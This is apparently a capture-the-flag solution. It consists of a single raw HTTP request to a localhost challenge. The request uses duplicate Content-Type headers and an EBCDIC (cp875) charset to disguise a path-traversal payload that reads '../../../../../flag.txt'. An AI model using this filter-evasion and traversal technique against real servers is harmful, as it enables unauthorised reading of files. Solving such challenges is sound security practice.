1. Get the flag
```
POST / HTTP/1.1
Host: localhost
Content-Type: multipart/form-data; boundary=x;
Content-Type: application/x-www-form-urlencoded; charset=cp875
Content-Length: 183

--x
Content-Disposition: form-data; name="y"

&%87%89%a5%85=%94%85&%a3%88%85=%86%93%81%87&%86%89%93%85=%4b%4b%61%4b%4b%61%4b%4b%61%4b%4b%61%4b%4b%61%86%93%81%87%4b%a3%a7%a3&
--x--
```
